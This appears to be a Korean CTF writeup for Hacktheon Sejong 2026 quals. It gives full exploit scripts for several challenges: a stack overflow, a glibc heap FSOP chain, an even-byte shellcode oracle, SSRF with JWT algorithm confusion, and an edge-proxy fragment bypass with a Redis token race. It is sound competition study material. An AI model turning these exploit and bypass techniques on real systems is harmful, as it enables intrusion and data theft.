---
title: "Hacktheon Sejong 2026 Quals Writeup"
published: 2026-04-28
description: "Hacktheon Sejong 2026 Quals에서 푼 문제 풀이를 정리했다"
category: "CTF/Wargame"
tags: ["Hacktheon Sejong", "CTF", "Writeup"]
draft: false
---

## Pwnable

### Immutable

키워드

* Stack Buffer Overflow
* Local Variable Overwrite
* Canary Bypass

구조는 단순했다.

1. `scanf("%s", buf)`에서 길이 제한 없이 입력을 받는다.
2. 입력 버퍼는 `[rbp-0x90]`, 비교 변수는 `[rbp-0x10]`에 있다.
3. `0x80` 바이트를 채운 뒤 `0xdeadbeef`를 쓰면 비교 변수만 바뀐다.
4. canary는 `[rbp-0x8]`에 있으므로 건드리지 않는다.
5. 조건문을 통과하면 바이너리 안의 `system("/bin/sh")`가 호출된다.

보호기법은 Full RELRO, Canary, NX, PIE가 모두 켜져 있었다.
다만 return address까지 덮을 필요는 없고, canary 앞에 있는 local variable만 바꾸면 된다.

스택 배치는 이렇게 잡힌다.

```text
rbp-0x90 : input buffer
...
rbp-0x10 : check variable
rbp-0x08 : stack canary
```

그래서 payload도 바로 정해진다.

```python
payload = b"A" * 0x80 + p32(0xdeadbeef)
```

이 payload를 보내면 shell이 뜨고, 거기서 플래그를 읽었다.

익스플로잇 코드

```python
#!/usr/bin/env python3
from pwn import *


HOST = args.HOST or "3.37.44.62"
PORT = int(args.PORT or 33201)


def main():
    payload = b"A" * 0x80 + p32(0xDEADBEEF)

    io = remote(HOST, PORT)
    io.recvuntil(b"input: ")
    io.sendline(payload)
    io.sendline(b"cat flag; exit")
    print(io.recvall(timeout=3).decode("latin-1"), end="")


if __name__ == "__main__":
    main()
```

플래그 : `hacktheon2026{ed2190f6865ca1e3fea816b296445228064a51ec9492b518f514a60624f43d850738dd60b2c9d0893cb5c30f7d1efeaa575527f0b8534a96aa170356d2f8e2d0f3da4b43880faa71}`

### Old Days

키워드

* glibc 2.39
* UAF
* Largebin Attack
* FSOP
* House of Apple 2
* SIGSEGV Handler

note manager로 구현된 heap 문제였다.
`delete` 이후 note pointer와 size를 초기화하지 않아서 UAF가 발생한다.

전체 풀이는 대략 이런 순서로 갔다.

1. freed large chunk를 `read`해서 `main_arena` 주소를 leak한다.
2. largebin chunk의 self pointer로 heap 주소를 구한다.
3. stdin pipe를 nonblocking으로 바꿔 slot에 잡히지 않는 live chunk를 만든다.
4. largebin attack으로 `_IO_list_all`을 fake FILE 쪽으로 돌린다.
5. House of Apple 2 흐름에 맞춰 fake FILE chain을 구성한다.
6. `stdin->_markers`를 오염시켜 내부 SIGSEGV를 발생시킨다.
7. SIGSEGV handler가 `exit(1)`을 호출하고, exit flush에서 fake FILE이 실행된다.

먼저 UAF read로 leak을 잡았다.
unsorted bin fd에서 libc base를 계산하고, largebin에 들어간 chunk의 `fd_nextsize` self pointer로 heap base를 구했다.

그 다음 관건은 안정적인 trigger였다.
원격에서는 바이너리가 setuid-root로 실행되고, 외부에서 signal을 보내는 방식은 사용할 수 없었다.
그래서 문제 내부의 SIGSEGV handler를 이용했다.
handler는 특정 상태에서 `exit(1)`을 호출하므로, 프로세스 내부에서 SIGSEGV를 만들면 exit flush까지 도달할 수 있다.

FSOP 쪽은 `_IO_list_all`에 fake FILE을 연결하고, wide data/vtable을 House of Apple 2 흐름에 맞췄다.
최종 호출은 `system("cat flag")`가 되도록 구성했다.

마지막으로 건드린 곳은 `stdin->_markers`였다.
largebin attack으로 marker list를 잘못된 chunk로 돌려두면, 다음 입력 처리에서 stdin marker를 따라가다가 SIGSEGV가 발생한다.
이 SIGSEGV가 handler를 거쳐 `exit(1)`로 이어지고, exit flush에서 fake FILE chain이 실행된다.

정리하면 이런 흐름이다.

```text
UAF read
  -> libc leak / heap leak
  -> largebin attack(_IO_list_all)
  -> fake FILE chain
  -> largebin attack(stdin->_markers)
  -> scanf/getchar internal SIGSEGV
  -> exit flush
  -> system("cat flag")
```

익스플로잇 코드

```python
#!/usr/bin/env python3
from pwn import *
import os, fcntl, select, time, sys

context.binary = exe = ELF('./deploy/prob', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = './ld-linux-x86-64.so.2'

class PipeProc:
    def __init__(self, argv):
        self.rin, self.win = os.pipe()
        self.rout, self.wout = os.pipe()
        self.buf = b''
        pid = os.fork()
        if pid == 0:
            os.dup2(self.rin, 0)
            os.dup2(self.wout, 1)
            os.dup2(self.wout, 2)
            for fd in (self.rin, self.win, self.rout, self.wout):
                try: os.close(fd)
                except OSError: pass
            os.execv(argv[0], argv)
        self.pid = pid
        os.close(self.wout)
        self.orig_flags = fcntl.fcntl(self.rin, fcntl.F_GETFL)

    def set_nb(self, enabled):
        flags = self.orig_flags | (os.O_NONBLOCK if enabled else 0)
        fcntl.fcntl(self.rin, fcntl.F_SETFL, flags)

    def send(self, data):
        os.write(self.win, data)

    def _read_some(self, timeout):
        r, _, _ = select.select([self.rout], [], [], timeout)
        if not r:
            return b''
        data = os.read(self.rout, 4096)
        if not data:
            raise EOFError(self.buf[-200:])
        self.buf += data
        return data

    def recvuntil(self, pat, timeout=5):
        end = time.time() + timeout
        while pat not in self.buf:
            left = end - time.time()
            if left <= 0:
                raise TimeoutError((pat, self.buf[-300:]))
            self._read_some(left)
        i = self.buf.index(pat) + len(pat)
        out = self.buf[:i]
        self.buf = self.buf[i:]
        return out

    def recvn(self, n, timeout=5):
        end = time.time() + timeout
        while len(self.buf) < n:
            left = end - time.time()
            if left <= 0:
                raise TimeoutError((n, self.buf[-300:]))
            self._read_some(left)
        out = self.buf[:n]
        self.buf = self.buf[n:]
        return out

    def recvall(self, timeout=5):
        out = self.buf
        self.buf = b''
        end = time.time() + timeout
        while True:
            left = max(0, end - time.time())
            if left == 0:
                break
            try:
                d = self._read_some(left)
                if d:
                    out += self.buf
                    self.buf = b''
            except EOFError:
                out += self.buf
                self.buf = b''
                break
        return out


def start():
    return PipeProc([ld, '--library-path', '.', './deploy/prob'])


def wait_prompt(p):
    p.recvuntil(b'Choice: ')


def menu(p, choice):
    p.send(str(choice).encode() + b'\n')


def create(p, idx, size, data=b'X'):
    menu(p, 1)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b'Size')
    p.send(str(size).encode() + b'\n')
    p.recvuntil(b'Content: ')
    p.send(data)
    wait_prompt(p)


def alloc_fail(p, idx, size):
    menu(p, 1)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b'Size')
    p.set_nb(True)
    p.send(str(size).encode() + b'\n')
    p.recvuntil(b'Content: ')
    p.recvuntil(b'Choice: ', timeout=2)
    p.set_nb(False)
    p.send(b'\n')
    wait_prompt(p)


def read_raw(p, idx, size):
    menu(p, 2)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(f'Note[{idx}]: '.encode())
    data = p.recvn(size)
    p.recvuntil(b'Choice: ')
    return data


def edit(p, idx, data):
    menu(p, 3)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b'New content: ')
    p.send(data)
    wait_prompt(p)


def delete(p, idx):
    menu(p, 4)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    wait_prompt(p)


def build_fake_file(p2_user, libc_base):
    payload = bytearray(0x418)
    fake2 = p2_user + 0x100
    wide = p2_user + 0x220
    wide_vtable = p2_user + 0x320
    lock = p2_user + 0x3D0

    def hfield(off, val):
        payload[off - 0x10:off - 0x08] = p64(val)

    hfield(0x20, 0)
    hfield(0x28, 0)
    hfield(0x68, fake2)
    hfield(0x88, lock)
    payload[0xC0 - 0x10:0xC0 - 0x0C] = p32(0)

    o = fake2 - p2_user
    cmd = b' cat flag;cat deploy/flag\x00'
    payload[o:o+len(cmd)] = cmd

    def ffield(off, val):
        payload[o + off:o + off + 8] = p64(val)

    ffield(0x20, 0)
    ffield(0x28, 1)
    ffield(0x68, 0)
    ffield(0x88, lock)
    ffield(0xA0, wide)
    payload[o + 0xC0:o + 0xC4] = p32(0)
    ffield(0xD8, libc_base + libc.sym['_IO_wfile_jumps'])
    payload[0x220 + 0xE0:0x220 + 0xE8] = p64(wide_vtable)
    payload[0x320 + 0x68:0x320 + 0x70] = p64(libc_base + libc.sym['system'])
    return bytes(payload)


def build_fake_file_with_largebin_meta(p2_user, libc_base, meta):
    payload = bytearray(build_fake_file(p2_user, libc_base))

    payload[0:0x20] = meta[:0x20]

    fake2 = p2_user + 0x100
    lock = p2_user + 0x3D0
    wide0 = p2_user + 0x3A0

    def hfield(off, val):
        payload[off - 0x10:off - 0x08] = p64(val)

    hfield(0x68, fake2)
    hfield(0x88, lock)
    hfield(0xA0, wide0)
    payload[0xC0 - 0x10:0xC0 - 0x0C] = p32(1)
    return bytes(payload)


def main():
    p = start()
    wait_prompt(p)

    create(p, 0, 0x468, b'A')
    alloc_fail(p, 6, 0x18)
    create(p, 1, 0x458, b'B')
    alloc_fail(p, 6, 0x18)
    create(p, 2, 0x448, b'C')
    alloc_fail(p, 6, 0x18)
    create(p, 3, 0x438, b'D')
    alloc_fail(p, 6, 0x18)

    delete(p, 0)
    libc_base = u64(read_raw(p, 0, 8)) - 0x203B20
    log.info(f'libc_base = {libc_base:#x}')

    alloc_fail(p, 6, 0x478)
    p1_meta = read_raw(p, 0, 0x20)
    p1_user = u64(p1_meta[0x10:0x18])
    if (p1_user & 0xf) == 0:
        p1_hdr = p1_user
        p1_user = p1_hdr + 0x10
    else:
        p1_hdr = p1_user - 0x10
    if p1_hdr == 0 or (p1_hdr >> 40) == 0:
        raise RuntimeError('bad p1 leak')
    p2_user = p1_user + 0x470 + 0x20
    log.info(f'p1_user = {p1_user:#x}, p2_user = {p2_user:#x}')

    delete(p, 1)
    meta = bytearray(read_raw(p, 0, 0x20))
    meta[0x18:0x20] = p64(libc_base + libc.sym['_IO_list_all'] - 0x20)
    edit(p, 0, bytes(meta))
    alloc_fail(p, 6, 0x478)

    p3_user = p2_user + 0x460 + 0x20
    p4_user = p3_user + 0x450 + 0x20
    log.info(f'p3_user ~= {p3_user:#x}')

    delete(p, 2)
    p4_hdr = p4_user - 0x10
    meta1 = bytearray(read_raw(p, 0, 0x20))
    meta1[0x18:0x20] = p64(p4_hdr - 0x20)
    edit(p, 0, bytes(meta1))
    alloc_fail(p, 6, 0x478)

    delete(p, 3)
    meta2 = read_raw(p, 1, 0x20)
    edit(p, 1, build_fake_file_with_largebin_meta(p2_user, libc_base, meta2))

    target2 = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x60
    meta1 = bytearray(read_raw(p, 0, 0x20))
    meta1[0x18:0x20] = p64(target2 - 0x20)
    edit(p, 0, bytes(meta1))

    menu(p, 1)
    p.recvuntil(b'Index')
    p.send(b'6\n')
    p.recvuntil(b'Size')
    p.set_nb(True)
    p.send(b'1144\n')
    p.recvuntil(b'Content: ')
    p.recvuntil(b'Choice: ', timeout=2)
    p.set_nb(False)
    p.send(b'\n')
    for _ in range(32):
        p.send(b'1\n123456789012345678901234567890x\n')
        p.send(b'2\n123456789012345678901234567890x\n')
        p.send(b'3\n123456789012345678901234567890x\n')
        p.send(b'4\n123456789012345678901234567890x\n')
        p.send(b'123456789012345678901234567890x\n')
        time.sleep(0.02)
    out = p.recvall(timeout=5)
    sys.stdout.buffer.write(out)
    try:
        os.waitpid(p.pid, 0)
    except ChildProcessError:
        pass

if __name__ == '__main__':
    main()
```

플래그 : `hacktheon2026{o1d-d4y5_g1ibc_exp10it4ti0n}`

### even_made

키워드

* Shellcode
* Even-byte Constraint
* seccomp
* PIE Base Leak
* Crash Oracle

입력 shellcode는 모든 byte가 짝수여야 했다.
또한 seccomp가 `nanosleep`만 허용하므로, syscall로 플래그를 출력할 수 없었다.

플래그는 프로그램 시작 시 전역 변수 `flag_mem`에 올라간다.
출력 경로가 막혀 있어서, shellcode가 플래그 bit를 읽고 crash 종류로 bit 값을 알려주는 oracle을 만들었다.

구분은 이렇게 잡았다.

```text
bit == 1 -> SIGTRAP
bit == 0 -> SIGSEGV
```

PIE base는 shellcode 호출 직후 stack에 남아 있는 return address에서 잡았다.
even-byte instruction만 써야 해서 사용할 수 있는 instruction이 제한되지만, `pop rax`로 return address를 가져온 뒤 짝수 byte instruction 조합으로 `flag_mem`까지 offset을 더할 수 있었다.

bit leak shellcode는 대략 이런 모양이다.

```python
code  = b"\x58"
code += add_even_delta
code += b"\x8a\x00"
code += test_bit
code += b"\x74\x02"
code += b"\xcc"
code += b"\xf4"
```

remote에서는 같은 bit를 여러 번 보내 보고, crash 결과를 majority vote로 정했다.
이 과정을 `0x50` 바이트 정도 반복하면 null byte 전까지 플래그가 복구된다.

익스플로잇 코드

```python
from pwn import *
import time

HOSTS = [
    ("13.124.201.116", 1337),
    ("54.181.1.133", 1337),
    ("43.201.41.138", 1337),
]

context.log_level = "error"

BASE_DELTA = 0x2aba


def add_delta_code(delta):
    low = delta & 0xff
    high = (delta >> 8) & 0xff

    code = b""

    code += b"\x3c\x02"
    code += b"\x10\xd2"

    code += b"\x80\x04\x24" + bytes([low & 0xfe])

    code += b"\x80\x14\x14" + bytes([high & 0xfe])
    code += b"\x10\x74\x24\x02"

    if low & 1:
        code += b"\x00\x14\x24"
        code += b"\x10\x34\x14"
        code += b"\x10\x74\x24\x02"

    if high & 1:
        code += b"\x00\x14\x14"
        code += b"\x10\x74\x24\x02"

    code += b"\x58"

    assert all((x & 1) == 0 for x in code)
    return code


def make_payload(delta, bit):
    code = add_delta_code(delta)

    code += b"\x8a\x00"

    if bit == 0:
        code += b"\xd0\xe0"
        code += b"\xa8\x02"
    else:
        code += b"\xa8" + bytes([1 << bit])

    code += b"\x74\x02"
    code += b"\xcc"
    code += b"\x50"
    code += b"\xf4"

    assert len(code) <= 0x900
    assert all((x & 1) == 0 for x in code)
    return code


def query(delta, bit, attempt=0):
    host, port = HOSTS[attempt % len(HOSTS)]
    payload = make_payload(delta, bit)

    io = remote(host, port, timeout=2)
    io.recvuntil(b"shellcode: ")
    io.send(payload)
    io.shutdown("send")
    out = io.recvall(timeout=2)
    io.close()

    if b"Trace/breakpoint" in out:
        return 1
    if b"Segmentation fault" in out or b"Alarm clock" in out:
        return 0

    raise RuntimeError(out)


def leak_bit(delta, bit):
    res = []

    for i in range(3):
        try:
            res.append(query(delta, bit, i))
        except Exception:
            time.sleep(0.05)

    if not res:
        return 0

    return 1 if sum(res) * 2 >= len(res) else 0


flag = b""

for i in range(0x50):
    v = 0

    for bit in range(8):
        v |= leak_bit(BASE_DELTA + i, bit) << bit

    if v == 0:
        break

    flag += bytes([v])
    print(flag)

print(flag.decode())
```

플래그 : `hacktheon2026{Ev3n_R3str1ct3d_Sh3lLc0d3_M4sT3r}`

## Reversing

### Brain Outside

키워드

* Reversing
* Remote Code Loading
* RWX mmap
* Self-decrypting Shellcode
* PNG Recovery

문제 이름처럼 실제 코드는 바이너리 안에 없었다.
`client`는 서버에서 stage를 받아 RWX `mmap`에 올리고 바로 호출하는 loader다.

loader 쪽 동작은 대략 이렇다.

```c
read(sock, &len, 4);
buf = mmap(..., PROT_READ | PROT_WRITE | PROT_EXEC, ...);
read(sock, buf, len);
ret = ((uint64_t (*)())buf)();
send(sock, &ret, 8);
```

stage는 매번 다른 decrypt stub을 가지고 있었다.
8-byte XOR, cumulative add 후 XOR, NOT/pair swap 같은 변형이 반복되므로, stub을 패턴화해 body를 복호화했다.

처음에는 stage를 그대로 실행해서 통과하려고 했는데, 프로토콜이 생각보다 단순했다.
서버는 stage 반환값만 받기 때문에, 검증 코드를 실행하지 않고도 통과한 것처럼 ret 값을 보내며 다음 stage를 계속 받을 수 있다.

복호화된 stage 대부분은 `flag.png`의 특정 구간을 검증한다.
각 stage에서는 세 값만 뽑으면 됐다.

```text
file offset
length
expected bytes
```

이 값들을 빈 PNG에 계속 덮어썼다.

```python
with open("flag_recovered.png", "r+b") as f:
    f.seek(fileoff)
    f.write(expected)
```

stage를 충분히 모으면 gap이 없어진다.

```text
known 9193720 of 9193720
gaps 0 []
```

복원된 이미지는 아래와 같다.

![Brain Outside recovered flag](./flag_recovered.png)

플래그 : `hacktheon2026{90364e95eddf0fc1d5f54662d8e80913}`

### Recover It!

키워드

* ELF
* XOR
* `memcmp`
* Known Table Recovery

검증 루틴은 짧다.
입력 길이가 64인지 확인한 뒤, 각 byte에 `i + 0x67`을 XOR하고 `.data`의 `cmptable`과 비교한다.

식으로 쓰면 이렇게 된다.

```text
encoded[i] = input[i] ^ (i + 0x67)
encoded[i] == cmptable[i]
```

XOR은 자기 자신이 역연산이므로 정답은 바로 복구된다.

```text
input[i] = cmptable[i] ^ (i + 0x67)
```

`cmptable`은 `.data`의 `0x4020`에 있다.

```python
cmptable = bytes.fromhex(
    "555a0a595f09555f5614434a43441114"
    "41484c1e421a191c1cb9e3e3bae5e7b1"
    "b6ecbfe8b2bdbabbeba6f3a1f1a4a4a0"
    "f4aca0f9ffa5a9a8ad94c7979791c695"
)

correct = bytes(c ^ ((i + 0x67) & 0xff) for i, c in enumerate(cmptable))
```

익스플로잇 코드

```python
cmptable = bytes.fromhex(
    "555a0a595f09555f5614434a43441114"
    "41484c1e421a191c1cb9e3e3bae5e7b1"
    "b6ecbfe8b2bdbabbeba6f3a1f1a4a4a0"
    "f4aca0f9ffa5a9a8ad94c7979791c695"
)

correct_input = bytes(
    c ^ ((i + 0x67) & 0xff)
    for i, c in enumerate(cmptable)
)

print(correct_input.decode())
print(f"hacktheon2026{{{correct_input.decode()}}}")
```

플래그 : `hacktheon2026{22c34e819d2800db605d9fdbc9ba9ab71d6b3b016c49cd94624f545c3}`

### Until Executing

키워드

* OCaml Native
* Tagged Integer
* `fork`
* Closure
* Constraint Solving

OCaml native 바이너리다.
stripped이지만 동적 심볼에 `camlMain`, `camlProc_a_engine`, `camlProc_b_engine` 등이 남아 있어서 구조를 잡을 수 있었다.

parent만 따라가면 검증 루틴이 잘 보이지 않는다.
`run_child`가 `fork()`를 호출하고, 실제 verifier는 child process에서 실행된다.

입력은 이 조건을 만족해야 한다.

```text
length   = 64
alphabet = abcdefghijklmnopqrstuvwxyz_0123456789!
```

OCaml immediate integer는 `(n << 1) | 1` 식으로 표현된다.
따라서 disassembly에서 길이 비교 값으로 보이는 `0x81`은 실제로 64다.

`Proc_a_engine`과 `Proc_b_engine`은 둘 다 `explode -> run -> collapse` 구조다.
`run`에서 check closure를 쌓고, 마지막 `collapse`에서 실제 검증이 평가된다.
문제 제목이 가리키는 부분도 이 지점이었다.

문자는 ASCII 그대로 쓰이지 않고 alphabet index의 tagged value로 바뀐다.

```text
a -> 1
b -> 3
c -> 5
...
```

`Proc_b`의 current check와 state update를 Python으로 옮겨 candidate를 줄였다.
branch는 빠르게 줄어들고, 마지막에는 하나만 남았다.
그 candidate를 `Proc_a` checker에도 넣어 검증했다.

복구된 내부 문자열은 이렇다.

```text
ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93
```

플래그 : `hacktheon2026{ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93}`

## Web

### Dark Harbor 1

키워드

* Edge Proxy
* SSRF
* Internal Metadata
* JWT Forgery
* JWKS Seed
* Algorithm Confusion
* Absolute-form Request Target

최종 목표는 api-server가 생성하는 internal admin console이었다.
여기에는 플래그와 Phase 2에서 쓰는 `deployment_hmac_secret`이 들어 있었다.

첫 단계는 `/build/fetch-artifact`의 redirect SSRF였다.
처음 URL은 검사하지만 redirect 이후 목적지는 다시 검사하지 않았다.
공개 redirector를 거쳐 `api-server:6000/config`를 읽으면 내부 routing 정보와 `HMAC_SECRET`이 나온다.

이 secret으로 api-server local JWT key를 만들 수 있었다.

```text
LOCAL_JWT_KEY = HMAC-SHA256(HMAC_SECRET, "darkharbor-local-jwt").hexdigest()
```

이 key로 `role=pipeline_admin`, `iss=darkharbor-local` 토큰을 만들면 pipeline admin API를 사용할 수 있다.

그 다음은 policy seed였다.
public key PEM을 JUnit report의 첫 번째 failure output에 넣어 업로드하면, policy engine이 그 PEM을 JWKS entry로 가져간다.

`/internal/policy-seed`는 edge proxy에서 막히지만, absolute-form request target과 percent-encoding을 섞으면 우회할 수 있다.

```text
request target = http://api-server/%69nternal/policy-seed
```

edge proxy는 이를 `/internal`로 보지 못하고, Fastify는 decode 후 `/internal/policy-seed` route로 처리한다.

마지막 취약점은 `fast-jwt` 검증 차이였다.
policy engine은 seed된 PEM 앞에 audit banner로 개행을 붙인다.

```text
key = "\n" + public_key_pem
```

이 값이 RSA public key로 정상 인식되지 않고 HS256 secret처럼 쓰였다.
따라서 같은 값을 HMAC key로 사용해 `role=admin` policy token을 만들 수 있었다.

이 token을 들고 같은 request-target 우회로 `/internal/admin-console.json`을 읽었다.

익스플로잇 코드

```python
import base64
import hashlib
import hmac
import json
import subprocess
import time
from pathlib import Path

import requests

BASE = "http://15.164.173.78:8080"
WORKSPACE_ID = 559
WORKSPACE_TOKEN = "<workspace_token>"
HMAC_SECRET = "a]Kx9#mP$vQ2nR7wF4jL8cB5hT0yU3eA"
KID = "axii-kid-559"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def hs256(secret: bytes, header: dict, payload: dict) -> str:
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = b64url(hmac.new(secret, signing_input.encode(), hashlib.sha256).digest())
    return signing_input + "." + sig

subprocess.run(["openssl", "genrsa", "-out", "/tmp/dh_rsa.pem", "2048"], check=True)
subprocess.run(["openssl", "rsa", "-in", "/tmp/dh_rsa.pem", "-pubout", "-out", "/tmp/dh_rsa_pub.pem"], check=True)
pub = Path("/tmp/dh_rsa_pub.pem").read_text()

xml = (
    '<?xml version="1.0"?>'
    '<testsuite name="seed"><testcase name="pem">'
    '<failure><![CDATA[' + pub + ']]></failure>'
    '</testcase></testsuite>'
)
r = requests.post(
    f"{BASE}/api/builds/{WORKSPACE_ID}/test-report",
    headers={
        "Authorization": f"Bearer {WORKSPACE_TOKEN}",
        "Content-Type": "application/xml",
    },
    data=xml,
)
r.raise_for_status()
report_id = r.json()["report_id"]

r = requests.post(
    BASE + "/",
    headers={
        "Authorization": f"Bearer {WORKSPACE_TOKEN}",
        "Content-Type": "application/json",
    },
    data=json.dumps({
        "workspace_id": WORKSPACE_ID,
        "report_id": report_id,
        "kid": KID,
    }),
)

now = int(time.time())
policy_token = hs256(
    ("\n" + pub).encode(),
    {"alg": "HS256", "typ": "JWT", "kid": KID},
    {"sub": "axii", "role": "admin", "iat": now, "exp": now + 600},
)

print("Use curl:")
print(
    "curl --request-target 'http://api-server/%69nternal/admin-console.json' "
    f"'{BASE}/' -H 'X-Policy-Token: {policy_token}'"
)
```

플래그 : `hacktheon2026{sil3nt_tid3_bre4ch}`

### Dark Harbor 2

키워드

* Edge Proxy
* Fragment Confusion
* Internal Route Bypass
* HMAC Forgery
* Redis Token Race
* AES-GCM

Dark Harbor 2는 Phase 1에서 얻은 `deployment_hmac_secret`으로 시작했다.
`/api/phase1-handoff`에 secret을 보내면 REVIEW 상태의 `workspace_id`와 deploy API용 `admin_jwt`가 나온다.

플래그는 policy-engine의 `/internal/admin/policy-override`에서 암호화된다.
이 route는 internal 전용이고, JWT와 `X-Internal-HMAC`를 모두 확인한다.
인증값은 Phase 1에서 얻은 `HMAC_SECRET`으로 만들 수 있으므로, 남은 문제는 internal route 접근이었다.

우회는 `#` 처리 차이에서 나왔다.

```text
/internal/admin/policy-override#/../../../health/policy-engine
```

edge proxy는 `#`를 path 문자처럼 보고 path traversal 정규화를 한다.
결과적으로 `/health/policy-engine`으로 라우팅된다.
반면 FastAPI/Uvicorn은 `#` 뒤를 fragment처럼 보고 `request.url.path`에서 제외한다.
따라서 실제 handler는 `/internal/admin/policy-override`가 된다.

일반 URL에 `#`를 넣으면 클라이언트가 fragment를 서버로 보내지 않기 때문에, raw HTTP나 `curl --request-target`이 필요했다.

override가 성공하면 `deploy_token`과 `encrypted_secret`이 나온다.
아직 플래그는 AES-GCM으로 암호화되어 있어서 `session_seal`과 `signing_key`가 필요했다.

deploy token 사용 로직은 Redis에서 token을 `GET`한 뒤 `DEL`한다.
두 동작이 원자적이지 않아서, 같은 token에 `seal`과 `sign` 요청을 동시에 보내면 둘 다 `GET`에 성공할 수 있었다.

```text
seal -> session_seal
sign -> signing_key
```

복호화 key는 이렇게 만들었다.

```python
key = HMAC_SHA256(signing_key, session_seal)[:32]
nonce = encrypted_secret[:12]
flag = AESGCM(key).decrypt(nonce, encrypted_secret[12:], None)
```

익스플로잇 코드

```python
import base64
import concurrent.futures
import hashlib
import hmac
import json
import socket
import threading
import time
from urllib import error as uerr
from urllib import request as ureq

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


HOST = "3.38.176.232"
PORT = 8080
BASE = f"http://{HOST}:{PORT}"
SECRET = "a]Kx9#mP$vQ2nR7wF4jL8cB5hT0yU3eA"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64json(obj) -> str:
    return b64url(json.dumps(obj, separators=(",", ":")).encode())


def api_json(path, method="GET", body=None, token=None):
    data = None
    headers = {"Content-Type": "application/json"}
    if body is not None:
        data = json.dumps(body, separators=(",", ":")).encode()
    if token:
        headers["Authorization"] = "Bearer " + token

    req = ureq.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with ureq.urlopen(req, timeout=8) as resp:
            return resp.status, json.loads(resp.read().decode())
    except uerr.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {"error": "http_error"}


def policy_jwt() -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": "phase2-override",
        "role": "pipeline_admin",
        "exp": int(time.time()) + 600,
    }
    signing_input = b64json(header) + "." + b64json(payload)
    sig = hmac.new(SECRET.encode(), signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def raw_http(method, target, headers, body=b""):
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(8)

    lines = [
        f"{method} {target} HTTP/1.1",
        f"Host: {HOST}:{PORT}",
    ]
    for k, v in headers.items():
        lines.append(f"{k}: {v}")
    lines += [
        f"Content-Length: {len(body)}",
        "Connection: close",
        "",
        "",
    ]

    s.sendall("\r\n".join(lines).encode() + body)
    data = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        data += chunk
    s.close()

    raw_body = data.split(b"\r\n\r\n", 1)[1]
    return json.loads(raw_body.decode())


def call_override(workspace_id: int):
    body = json.dumps(
        {
            "workspace_id": workspace_id,
            "reason": "phase2 edge fragment routing bypass",
            "scope": "deploy",
            "target_state": "APPROVED",
        },
        separators=(",", ":"),
    ).encode()

    ts = str(int(time.time()))
    path = "/internal/admin/policy-override"
    msg = f"POST\n{path}\n{ts}\n{hashlib.sha256(body).hexdigest()}"
    x_hmac = "SHA256:" + ts + ":" + hmac.new(
        SECRET.encode(),
        msg.encode(),
        hashlib.sha256,
    ).hexdigest()

    return raw_http(
        "POST",
        "/internal/admin/policy-override#/../../../health/policy-engine",
        {
            "Authorization": "Bearer " + policy_jwt(),
            "X-Internal-HMAC": x_hmac,
            "X-Pipeline-State": "REVIEW",
            "Content-Type": "application/json",
        },
        body,
    )


def build_use_request(workspace_id, admin_jwt, deploy_token, action):
    body = json.dumps(
        {"token": deploy_token, "action": action},
        separators=(",", ":"),
    ).encode()

    return (
        "\r\n".join(
            [
                f"POST /api/deploy/{workspace_id}/use-token HTTP/1.1",
                f"Host: {HOST}:{PORT}",
                "Authorization: Bearer " + admin_jwt,
                "Content-Type: application/json",
                f"Content-Length: {len(body)}",
                "Connection: close",
                "",
                "",
            ]
        ).encode()
        + body
    )


def send_raw(raw):
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.settimeout(5)
    s.sendall(raw)
    data = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        data += chunk
    s.close()

    raw_body = data.split(b"\r\n\r\n", 1)[1]
    return json.loads(raw_body.decode())


def race_use_token(workspace_id, admin_jwt, deploy_token):
    seal_req = build_use_request(workspace_id, admin_jwt, deploy_token, "seal")
    sign_req = build_use_request(workspace_id, admin_jwt, deploy_token, "sign")

    start = threading.Event()

    def worker(kind, raw):
        start.wait()
        return kind, send_raw(raw)

    futures = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for _ in range(20):
            futures.append(ex.submit(worker, "seal", seal_req))
            futures.append(ex.submit(worker, "sign", sign_req))

        start.set()

        session_seal = None
        signing_key = None
        for fut in concurrent.futures.as_completed(futures):
            kind, obj = fut.result()
            if not obj.get("valid"):
                continue
            if kind == "seal" and obj.get("session_seal"):
                session_seal = obj["session_seal"]
            if kind == "sign" and obj.get("signing_key"):
                signing_key = obj["signing_key"]

        return session_seal, signing_key


def decrypt_flag(encrypted_secret, signing_key, session_seal):
    raw = base64.b64decode(encrypted_secret)
    nonce, ct = raw[:12], raw[12:]
    key = hmac.new(
        signing_key.encode(),
        session_seal.encode(),
        hashlib.sha256,
    ).digest()[:32]
    return AESGCM(key).decrypt(nonce, ct, None).decode()


status, handoff = api_json(
    "/api/phase1-handoff",
    "POST",
    {"hmac_secret": SECRET},
)
assert status == 200, handoff

workspace_id = handoff["workspace_id"]
admin_jwt = handoff["admin_jwt"]
print("[+] workspace_id:", workspace_id)

session_seal = None
signing_key = None
override = None

for attempt in range(8):
    override = call_override(workspace_id)
    print("[+] override:", override["status"])

    session_seal, signing_key = race_use_token(
        workspace_id,
        admin_jwt,
        override["deploy_token"],
    )
    if session_seal and signing_key:
        break

